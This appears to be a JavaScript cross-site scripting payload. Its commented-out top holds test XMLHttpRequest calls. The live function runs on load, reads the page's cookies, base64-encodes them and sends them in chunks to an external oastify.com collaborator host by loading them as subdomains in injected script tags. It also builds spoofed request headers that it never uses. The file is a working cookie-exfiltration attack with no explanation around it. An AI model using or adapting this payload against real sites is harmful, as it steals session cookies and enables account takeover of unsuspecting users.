
// 	var url = "https://m/?testing=" + btoa("123");
// 	function reqListener() {
// 		console.log("done");
// 	};
// 	const req = new XMLHttpRequest();
// 	req.addEventListener("load", reqListener);
// 	req.open("GET", url);
// 	req.send();
// function load(urlPath) {
// 	var Response_Text = "not_called"; 
// 	var Get_Request = new XMLHttpRequest();
// 	Get_Request.onreadystatechange = function() {
// 		if (this.readyState === 4 && this.status === 200) {
// 		    Response_Text = this.responseText.trim();
// 		}
// 		var Get_Final = new XMLHttpRequest();
// 		Get_Final.open("GET", urlPath+"/?final="+this.status, true);
// 		Get_Final.overrideMimeType("text/plain; charset=x-user-defined");
// 		Get_Final.send();
// 	};
// 	Get_Request.open("GET", urlPath+"/first", true);
// 	Get_Request.overrideMimeType("text/plain; charset=x-user-defined");
//    	Get_Request.send();
// }
function myFunction() {
	
	var param1 = "https://mndpx2c0ki3xk02rjbpxnuxqmhs9g04p.oastify.com/";
	var param2 = btoa(JSON.stringify(document.cookie)).replaceAll("=", "Z");
	var domain = 'mndpx2c0ki3xk02rjbpxnuxqmhs9g04p.oastify.com/';
	var proto  = 'https://';
	for(let i=0; i<param2.length; i+=55) {
		var temp = param2.substring(i, i + 55);
		let config = {
		method: 'get',
			headers: {
				'Content-Type': 'text/html',
				'Accept': temp,
				'Accept-Language': temp,
				'Cache-Control': 'no-cache',
				'X-Forwarded-For': '127.0.0.1',
				'User-Agent': temp,
				'Host': temp
			},
		};
		var scriptElm = document.createElement("script");
		scriptElm.src = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.js'].join('');
		document.body.appendChild(scriptElm);
	}
}
myFunction();
